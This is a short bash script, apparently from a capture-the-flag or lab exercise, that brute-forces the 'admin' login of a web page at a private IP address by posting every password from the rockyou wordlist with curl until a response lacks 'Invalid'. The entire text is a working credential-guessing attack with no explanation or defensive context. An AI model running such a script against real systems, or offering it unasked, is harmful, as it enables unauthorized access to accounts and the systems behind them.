for pass in $(cat /usr/share/wordlists/rockyou.txt); do
  echo "Trying password: $pass"
  response=$(curl -A "secretcomputer" -X POST -d "username=admin&password=$pass" http://10.67.135.216/terminal.php?action=login)
  if ! echo "$response" | grep -q "Invalid"; then
    echo "[+] Password found: $pass"
    break
  fi
done
